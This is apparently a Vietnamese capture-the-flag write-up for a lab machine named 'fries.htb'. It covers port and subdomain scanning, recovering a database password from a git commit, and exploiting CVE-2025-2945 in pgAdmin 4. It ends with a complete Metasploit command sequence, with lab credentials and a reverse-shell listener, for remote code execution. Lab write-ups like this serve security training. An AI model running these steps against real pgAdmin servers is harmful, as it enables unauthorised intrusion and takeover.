- Scan port như thường lệ , ta có được 22 , 80  
![alt text](image.png)
![alt text](image-1.png)
```c
nmap -p- -sC -sV  10.10.11.97
```

- Cổng 80 là web r 
![alt text](image-2.png)

- Scan subdomain 
![alt text](image-3.png)

- Mở ra ta sẽ thấy giao diện khác `http://code.fries.htb`
![alt text](image-4.png)

- Theo đề bài cung cấp ta sẽ đăng nhập với `d.cooper@fries.htb / D4LE11maan!!`

- Để mở rộng atk surface seach từ khóa `fries` trong source để xem còn trang web nào đang được host không 
![alt text](image-5.png)

- Truy cập vào `http://db-mgmt05.fries.htb` -> version 9.1 . Khiến ta liên tưởng đến CVE ->  [CVE-2025-2945](https://www.cvereports.com/cve-2025-2945-remote-code-execution-in-pgadmin-4/)
![alt text](image-6.png)
![alt text](image-7.png)

- Dùng METASPLOIT để RCE pgAdmin4, Tuy nhiên cần tìm user/paswd mới có thể RCE 
- Mục tiêu: pgAdmin 4 trước 9.2. 
- Điều kiện bắt buộc: phải có tài khoản đăng nhập pgAdmin (authenticated) và thường cần thông tin đăng nhập DB để mở/khởi tạo phiên Query Tool (lấy transaction/session cần cho khai thác). 
Rapid7
- Cơ chế lỗi: trong Query Tool, tham số query_commited ở endpoint download bị đưa vào Python eval() không an toàn → dẫn tới thực thi mã từ xa (RCE). 
Rapid7
+1
- Kết quả: nếu thành công, attacker có thể chạy lệnh/mã trên máy chủ chạy pgAdmin (tuỳ cấu hình sẽ chạy với quyền của tiến trình pgAdmin). 
Rapid7

- Thấy được commit của admin 
![alt text](image-10.png)

- Lấy được passwd của database ở  Initial Commit 
![alt text](image-11.png)

- RCE thôi 
![alt text](image-12.png)
```code
msfconsole
use exploit/multi/http/pgadmin_query_tool_authenticated
set RHOSTS db-mgmt05.fries.htb
set USERNAME d.cooper@fries.htb
set PASSWORD D4LE11maan!!
set DB_USER root
set DB_PASS PsqLR00tpaSS11
set DB_NAME ps_db
set LHOST <IP>
set LPORT 4444
exploit
```


